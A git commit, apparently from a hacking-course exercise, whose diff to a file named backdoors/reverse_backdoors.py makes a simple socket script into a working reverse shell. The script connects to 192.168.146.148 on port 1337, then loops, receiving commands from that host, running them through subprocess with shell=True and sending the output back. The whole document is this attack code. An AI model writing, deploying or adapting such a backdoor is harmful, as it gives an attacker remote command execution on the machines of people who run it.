5002a50626adfd5cb4b0933f9df7b0648aa82f1b
jakiiii <me.jaki@outlook.com>
2018-12-18 11:33:50 +0600

    sending and receiveing data remotely

--- backdoors/reverse_backdoors.py
+++ backdoors/reverse_backdoors.py
@@ -1,12 +1,18 @@
 #!/user/bin/env python
 import socket
+import subprocess
+
+def execute_system_command(command):
+	return subprocess.check_output(command, shell=True).decode()
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("192.168.146.148", 1337))
 
-connection.send("\n[+] connection established.\n".encode())
+data = connection.send("\n[+] connection established!\n".encode("utf-8"))
 
-receive_data = connection.recv(1024)
-print(receive_data)
+while True:
+	command = connection.recv(1024)
+	command_data = execute_system_command(command.decode("utf-8"))
+	connection.send(command_data.encode("utf-8"))
 
 connection.close()
